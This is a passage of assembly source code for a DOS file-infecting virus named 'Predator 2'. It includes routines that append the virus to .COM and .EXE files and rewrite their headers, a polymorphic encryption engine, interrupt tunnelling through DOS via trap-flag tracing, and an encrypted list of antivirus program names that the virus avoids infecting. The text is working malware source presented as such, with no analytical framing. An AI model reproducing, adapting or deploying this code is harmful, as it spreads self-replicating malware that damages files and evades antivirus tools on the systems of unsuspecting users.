                mov     dx,offset tracer         
                call    set_int
                call    pop_all
                push    ax
                pushf    
                pop     ax
                or      ah,trap_on              ; trap flag on
                push    ax
                popf      
                pop     ax
                jmp     cs:int_21               ; jump to DOS with trapping
                                                ; on

;****************************************************************************;
;       Tunnel jump into DOS and return directly to caller                   ;
;****************************************************************************;

pred2_21_iret:  call    tunnel                  ; tunnel jump into DOS
                retf    2h                      ; return to caller


;****************************************************************************;
;       Append Predator 2 to the file.
;****************************************************************************;

infect_file:    mov     ah,3fh                  ; read bytes    
                mov     cx,18h                  ; all of .exe header
                mov     dx,offset file_header
                call    call_21
                jb      infect_file_err
                sub     cx,ax                   ; 18h bytes read?
                jne     infect_file_err
                mov     si,dx                   ; ptr to file_header
                mov     ax,4202h                ; lseek to end
                cwd
                call    call_21
                xchg    cx,ax                   ; save size in CX
                cld
                lodsw                           ; get first word
                mov     ds:header,ax            ; save first word
                cmp     ax,'ZM'                 ; .exe file?
                je      call_fix_exe
                cmp     ax,'MZ'                 ; .exe file?
                je      call_fix_exe
                or      di,di                   ; Is it a .com file?
                jne     infect_file_err
                or      dx,dx                   ; too big for .com?
                jne     infect_file_err
                cmp     cx,0-(file_size + 1000) ; too big to infect?
                ja      infect_file_err
                cmp     cx,1000                 ; too small?
                jb      infect_file_err
                mov     al,ds:[si]              ; get byte 3
                mov     byte ptr ds:header+2,al ; save byte 3 of .com file
                sub     cx,3h                   ; jump displacement
                mov     byte ptr ds:[si-2],0e9h ; JMP ($ + 3) + xxxx
                mov     ds:[si-1],cx            ; save displacement for jump
                add     cx,103h                 ; undo displacement and
                                                ; skip PSP (100h bytes)
                xchg    cx,ax                   ; IP in AX
                jmp     short append_pred2

call_fix_exe:   call    fix_exe                 ; fix .exe header

append_pred2:   push    cs
                pop     es
                call    encrypt                 ; encrypt Predator 2
                mov     ah,40h                  ; append Predator to file
                mov     cx,file_size            ; Predator 2 + enough for 
                                                ; decryption routine
                mov     dx,offset crypt_buff
                call    call_21
                jb      infect_file_err
                sub     cx,ax                   ; all of Predator 2 written?
                jne     infect_file_err
                mov     ax,4200h                ; lseek to start
                cwd
                call    call_21
                jb      infect_file_err
                mov     ah,40h                  ; write header to file
                mov     cx,18h
                mov     dx,offset file_header
                call    call_21
                clc
                retn

infect_file_err:stc
                retn


;****************************************************************************;
;       Alter .exe file so that Predator 2 recieves control upon execution.  ;
;****************************************************************************;
                
fix_exe:        push    bx
                les     ax,dword ptr ds:[si.eh_ip-2] ; get IP and CS
                mov     ds:header_ip,ax
                mov     ds:header_cs,es         ; save Code ptrs
                les     ax,dword ptr ds:[si.eh_ss-2] ; get SS and SP
                mov     ds:header_ss,ax
                mov     ds:header_sp,es         ; save Stack ptrs
                push    cs
                pop     es
                xchg    ax,cx                   ; low size into AX
                mov     bx,ax                   ; save file size
                mov     di,dx                   ; save high file size
                mov     cx,200h                 ; divide into 512 byte pages
                div     cx
                inc     ax                      ; fix up
                cmp     ds:[si.eh_size-2],ax    ; correct size?
                jne     fix_exe_err
                cmp     ds:[si.eh_modulo-2],dx  ; correct remainder?
                jne     fix_exe_err
                
                add     ax,file_size / 512      ; add Predator 2's size
                add     dx,file_size mod 512    ; add remainder
                cmp     dx,200h                 ; above 512?
                cmc
                adc     ax,0                    ; if yes, add 1 to AX
                and     dh,1h                   ; make it below 200h
                mov     ds:[si.eh_size-2],ax    ; save new file size
                mov     ds:[si.eh_modulo-2],dx  ; save new modulo
                mov     dx,di                   ; high size into DX
                xchg    bx,ax                   ; low size into AX
                mov     bx,ds:[si.eh_size_header-2] ; get size of header
                xor     di,di
                mov     cx,4h
fix_exe_loop:   shl     bx,1                    ; multiply BX by 16
                rcr     di,1                    ; put carry in DI
                loop    fix_exe_loop
                sub     ax,bx                   ; get IP of end of file
                sbb     dx,di                   ; subtract carry
                mov     bx,0 - (file_size+1000)

fix_exe_ip_loop:cmp     ax,bx                   ; IP too high?
                jb      fix_exe_ok
                sub     ax,10h                  ; next paragraph down
                inc     dx                      ; next paragraph up
                jmp     short fix_exe_ip_loop
                
fix_exe_ok:     cmp     dx,0fh                  ; CS too large?
                ja      fix_exe_err
                mov     cl,4
                ror     dx,cl                   ; convert from high file size
                                                ; to segment displacement
                mov     ds:[si.eh_ip-2],ax      ; save IP of Predator 2
                mov     ds:[si.eh_cs-2],dx      ; save CS of Predator 2
                push    ax                      ; save IP for encryption
                sub     ax,bx                   ; make new SP
                and     al,not 1                ; make sure it's even!
                mov     ds:[si.eh_sp-2],ax
                add     dx,10h                  ; make new stack
                mov     ds:[si.eh_ss-2],dx
                shr     ax,cl                   ; convert to paragraphs
                add     ds:[si.eh_min_mem-2],ax ; add to minimum memory
                                                ; requirement
                pop     ax                      ; IP of Predator 2 upon
                                                ; execution
                cmp     ds:[si.eh_max_mem-2],-1 ; requesting all of memory?
                jne     fix_exe_err
                pop     bx
                clc
                retn

fix_exe_err:    pop     bx
                stc
                retn


;****************************************************************************;
;       Determine if file at DS:DX is a .com file, DI = 1 if it is, 0 if     ;
;       it isn't.                                                            ;
;****************************************************************************;

is_com:         push    ds
                pop     es
                mov     di,dx                   ; ptr to file
                mov     cx,80
                xor     ax,ax
                cld
                repne   scasb                   ; find end of file name
                jne     is_com_err
                std
                mov     si,di                   ; ptr to file name end
                xor     di,di                   ; default = no .com
                mov     cx,5h
                lodsb                           ; fix SI
                push    si
is_com_loop:    lodsb
                and     al,0dfh                 ; touppper
                xor     di,ax                   ; get checksum of extention
                shl     di,cl                   ; make sure it's .COM and
                                                ; not .CMO, .MCO, .MOC, etc.
                loop    is_com_loop
                sub     di,com_ext              ; if .com file, DI=0
                pop     si
                push    di                      ; save is_com result
                call    check_file              ; is it a AV program?
                pop     di                      ; get is_com result
                jb      is_com_err
is_not_com:     clc
                retn
                
is_com_err:     stc
                retn

;****************************************************************************;
;       Check to see if file name contains any bad strings                   ;
;****************************************************************************;

check_file:     push    cs
                pop     es
                mov     cx,(not_files_end-not_files)/4 ; number of string to
                                                       ; look for
                mov     di,offset not_files
check_file_loop:push    cx di si
                mov     bx,13-3                 ; file name plus null byte
check_file_loop2:mov    cx,4h
                push    di

check_file_loop1:std
                lodsb                           ; get byte from file name
                and     al,0dfh                 ; toupper
                xor     al,not_file_key1        ; encrypt it
                cld
                scasb                           ; scan for it
                loope   check_file_loop1
                pop     di
                jz      check_file_alert
                cmp     si,dx                   ; end of file name reached?
                je      check_file_next
                dec     bx                      ; one less character
                jne     check_file_loop2
check_file_next:pop     si di cx
                add     di,4h                   ; next string
                loop    check_file_loop
                clc
                retn

check_file_alert:pop    si di cx
                stc
                retn

                
;****************************************************************************;
;       Handler for int 24h during infection;  Return "Fail"                 ;
;****************************************************************************;

pred2_21_24:    mov     al,3h
                iret
                
;****************************************************************************;
;       Push all registers                                                   ;
;****************************************************************************;

push_all:       pop     cs:push_pop_ret
                pushf
                push    ax bx cx dx di si ds es
                jmp     cs:push_pop_ret


;****************************************************************************;
;       Pop all registers                                                    ;
;****************************************************************************;

pop_all:        pop     cs:push_pop_ret
                pop     es ds si di dx cx bx ax
                popf
                jmp     cs:push_pop_ret



call_disk:      cmp     dl,80h                  ; hard disk?
                jnb     call_disk_13
                call    call_40                 ; call floppy routines                       
                retn

call_disk_13:   call    call_13                 ; call hard disk routines
                retn

call_13:        pushf
                call    cs:int_13
                retn

call_fake_13:   pushf
                call    cs:fake_13
                retn

call_21:        pushf
                call    cs:int_21
                retn

call_fake_21:   pushf
                call    cs:fake_21
                retn

call_40:        pushf
                call    cs:int_40
                retn

call_fake_40:   pushf
                call    cs:fake_40
                retn


;****************************************************************************;
;       Files containing any of these strings in their names will not        ;
;       be infected.                                                         ;
;****************************************************************************;

not_files:      dd      not_file_key2 xor 'PROT'
                dd      not_file_key2 xor 'SCAN'
                dd      not_file_key2 xor 'CLEA'
                dd      not_file_key2 xor 'VSAF'
                dd      not_file_key2 xor 'CPAV'
                dd      not_file_key2 xor ('NAV.' and 0dfdfdfdfh)
                dd      not_file_key2 xor 'DECO'
not_files_end:


header          dw      20cdh                   ; .exe signature/.com first
                                                ; word
header_ip       dw      ?                       ; .exe ip/.com third byte
header_cs       dw      ?                       ; .exe cs displacement
header_sp       dw      ?                       ; .exe sp
header_ss       dw      ?                       ; .exe ss displacement

ran_num         dw      ?                       ; Random number



;****************************************************************************;
;       Encrypt Predator 2 for file based infections                         ;
;****************************************************************************;

encrypt:        push    bx bp
                xchg    bp,ax                   ; save ip of Predator 2
                mov     ax,-1
                call    random                  ; get a random key
                xchg    bx,ax                   ; save key for later use
                mov     si,offset decrypt       ; decryption routine
                mov     di,offset crypt_buff    ; where to store code
                cld
                movsw                           ; Push CS Pop DS
                movsb                           ; mov di,
                lodsw                           ; get start of decrypt
                add     ax,bp                   ; set to end
                stosw                           ; save offset
                movsb                           ; mov ax,
                lodsw
                mov     ax,bx                   ; key
                stosw                           ; save key
                movsw                           ; mov cx,
                movsw                           ; mov cx (cont) - dec cx
                movsw                           ; js decrypt_start
                mov     ax,7
                call    random                  ; get a random cryptor
                shl     ax,1
                shl     ax,1                    ; multiply by 4
                push    si
                mov     si,offset enc_tab       ; table of different cryptors
                add     si,ax                   ; get offset of cryptor
                mov     ax,1
                call    random
                test    al,1                    ; swap cryptors?
                cld
                lodsw                           ; get cryptor
                je      encrypt_get_op
                xchg    ax,ds:[si]              ; swap with un-cryptor
                mov     ds:[si-2],ax            ; save un-crypt
encrypt_get_op: stosw                           ; save in decryption
                lodsw                           ; get opposite cryptor
                mov     ds:encrypt_op+2,ax      ; save encryptor
                mov     ax,7
                call    random
                shl     ax,1
                shl     ax,1                    ; multiply by 4
                mov     si,offset key_tab       ; key changers
                add     si,ax                   ; get offset of key changer
                mov     ax,1
                call    random
                test    al,1                    ; do key changer or another
                                                ; cryptor?
                je      encrypt_get_key
                sub     si,key_tab-enc_tab      ; point to cryptor
encrypt_get_key:mov     al,1
                call    random
                test    al,1
                lodsw                           ; get key changer/cryptor
                je      encrypt_do_key
                xchg    ax,ds:[si]              ; switch with opposite
                mov     ds:[si-2],ax            ; save as original
encrypt_do_key: stosw                           ; store in decryption
                lodsw                           ; get opposite
                mov     ds:encrypt_op,ax        ; save in encryption loop
                pop     si                      ; offset into decrypt
                lodsw
                lodsw                           ; fix SI
                movsw                           ; dec di dec di
                movsw                           ; jmp decrypt_loop
                xor     si,si                   ; offset of Predator 2
                xor     cx,cx
                dec     di
                dec     di
                jmp     short $ + 2             ; flush prefetch

crypt_loop:     lodsw                           ; get virus code
                inc     di
                inc     di                      ; up pointer
                mov     ds:[di],ax              ; store code
                mov     ax,bx                   ; get key
encrypt_op      dw      ?                       ; cryptor
                dw      ?                       ; key changer/cryptor
                mov     bx,ax                   ; save updated key
                inc     cx                      ; up counter
                cmp     cx,(pred2_size + 1) / 2 ; done?
                jne     crypt_loop
                mov     word ptr ds:crypt_buff+(decrypt_key-decrypt),ax
                                                ; set key in decryption
                pop     bp bx
                retn

enc_tab:        xor     ds:[di],ax
                xor     ds:[di],ax
                xor     ds:[di],cx
                xor     ds:[di],cx
                add     ds:[di],ax
                sub     ds:[di],ax
                add     ds:[di],cx
                sub     ds:[di],cx
                not     word ptr ds:[di]
                not     word ptr ds:[di]
                neg     word ptr ds:[di]
                neg     word ptr ds:[di]
                ror     word ptr ds:[di],1
                rol     word ptr ds:[di],1
                ror     word ptr ds:[di],cl
                rol     word ptr ds:[di],cl

key_tab:        ror     ax,cl
                rol     ax,cl
                ror     ax,1
                rol     ax,1 
                not     ax
                not     ax   
                neg     ax
                neg     ax   
                ror     ah,cl
                rol     ah,cl
                ror     al,cl
                rol     al,cl
                add     ah,cl
                sub     ah,cl
                add     al,cl
                sub     al,cl


decrypt:        push    cs
                pop     ds
                db      0bfh                    ; mov di,
decrypt_ptr     dw      file_size - 2
                db      0b8h                    ; mov ax,
decrypt_key     dw      ?
                mov     cx,(pred2_size + 1) / 2
decrypt_loop:   dec     cx
                js      decrypt_start
                dd      ?
                dec     di
                dec     di
                db      0ebh                    ; jump short decrypt_loop
                db      0 - (($ + 1) - (decrypt_loop))

decrypt_start:

Dedicated:      db      0-'D'
                db      0-'e'
                db      0-'d'
                db      0-'i'
                db      0-'c'
                db      0-'a'
                db      0-'t'
                db      0-'e'
                db      0-'d'
                db      0-' '
                db      0-'t'
                db      0-'o'
                db      0-' '
                db      0-'A'
                db      0-'R'
                db      0-'C'
                db      0-'V'
                db      0-'.'
                db      0-'.'
                db      0-'.'
                db      0-' '

;****************************************************************************;
; Generate a random number between 0 and AX                                  ;
;****************************************************************************;


random:         push    cx dx ds
                xchg    cx,ax                   ; save maximum number
                xor     ax,ax
                mov     ds,ax                   ; segment of timer
                mov     ax,ds:[46ch]            ; get random word
                push    cs
                pop     ds
                add     ax,ds:[ran_num]         ; randomize
                ror     ax,1
                add     ds:[ran_num],ax
                ror     ax,1
                xor     ax,ds:[ran_num]
                xor     dx,dx
                inc     cx                      ; adjust
                je      random_ret              ; can't divide by zero!
                div     cx
                xchg    dx,ax                   ; return remainder
random_ret:     pop     ds dx cx
                retn





pred2_done:


;****************************************************************************;
;       The code that gets inserted into DOS during tunneling.               ;
;****************************************************************************;


tunnel_code     db      ?
tunnel_code_ip  dw      ?
tunnel_code_cs  dw      ?


int_1           dd      ?
int_13          dd      ?
fake_13         dd      ?
int_21          dd      ?
fake_21         dd      ?
int_40          dd      ?
fake_40         dd      ?

dos_seg         dw      ?

push_pop_ret    dw      ?

trace_mode      db      ?
step_inst       db      ?

file_header     dw      18h / 2h dup(?)

disk_buffer     dw      100h dup(?)

crypt_buff      db      file_size + 10 dup(?)
crypt_buff_end:

                db      file_size mod 512 dup(?) ; fix up for the damned DMA
                                                 ; boundary error

pred2_end:      



;****************************************************************************;
; For functions 11h and 12h                                                  ;
;****************************************************************************;

Directory       STRUC
DS_Drive        db ?
DS_Name         db 8 dup(0)
DS_Ext          db 3 dup(0)
DS_Attr         db ?
DS_Reserved     db 10 dup(0)
DS_Time         dw ?
DS_Date         dw ?
DS_Start_Clust  dw ?
DS_Size         dd ?
Directory       ENDS

;****************************************************************************;
; for functions 4eh and 4fh                                                  ;
;****************************************************************************;

DTA             STRUC
DTA_Reserved    db 21 dup(0)
DTA_Attr        db ?
DTA_Time        dw ?
DTA_Date        dw ?
DTA_Size        dd ?
DTA_Name        db 13 dup(0)
DTA             ENDS


Exe_Header      STRUC
EH_Signature    dw ?                    ; Set to 'MZ' or 'ZM' for .exe files
EH_Modulo       dw ?                    ; remainder of file size/512
EH_Size         dw ?                    ; file size/512
EH_Reloc        dw ?                    ; Number of relocation items
EH_Size_Header  dw ?                    ; Size of header in paragraphs
EH_Min_Mem      dw ?                    ; Minimum paragraphs needed by file
EH_Max_Mem      dw ?                    ; Maximum paragraphs needed by file
EH_SS           dw ?                    ; Stack segment displacement
EH_SP           dw ?                    ; Stack Pointer
EH_Checksum     dw ?                    ; Checksum, not used
EH_IP           dw ?                    ; Instruction Pointer of Exe file
EH_CS           dw ?                    ; Code segment displacement of .exe
Exe_Header      ENDS                      

Boot_Sector             STRUC
bs_Jump                 db 3 dup(?)
bs_Oem_Name             db 8 dup(?)
bs_Bytes_Per_Sector     dw ?
bs_Sectors_Per_Cluster  db ?
bs_Reserved_Sectors     dw ?               
bs_FATs                 db ?             ; Number of FATs
bs_Root_Dir_Entries     dw ?             ; Max number of root dir entries
bs_Sectors              dw ?             ; number of sectors; small
bs_Media                db ?             ; Media descriptor byte
bs_Sectors_Per_FAT      dw ?
bs_Sectors_Per_Track    dw ?               
bs_Heads                dw ?             ; number of heads
bs_Hidden_Sectors       dd ?
bs_Huge_Sectors         dd ?             ; number of sectors; large
bs_Drive_Number         db ?
bs_Reserved             db ?
bs_Boot_Signature       db ?
bs_Volume_ID            dd ?
bs_Volume_Label         db 11 dup(?)
bs_File_System_Type     db 8 dup(?)
Boot_Sector             ENDS
                
                
Partition_Table         STRUC
pt_Code                 db 1beh dup(?)  ; partition table code
pt_Status               db ?            ; 0=non-bootable 80h=bootable
pt_Start_Head           db ?            
pt_Start_Sector_Track   dw ?
pt_Type                 db ?            ; 1 = DOS 12bit FAT 4 = DOS 16bit FAT
pt_End_Head             db ?
pt_End_Sector_Track     dw ?
pt_Starting_Abs_Sector  dd ?
pt_Number_Sectors       dd ?
Partition_Table         ENDS


int_1_stack     STRUC
st_bp           dw ?                    ; pushed BP 
st_ip           dw ?                    ; offset of next instruction after
                                        ; interrupt
st_cs           dw ?                    ; segment of next instruction
st_flags        dw ?                    ; flags when interrupt was called
int_1_stack     ENDS


                end     pred2

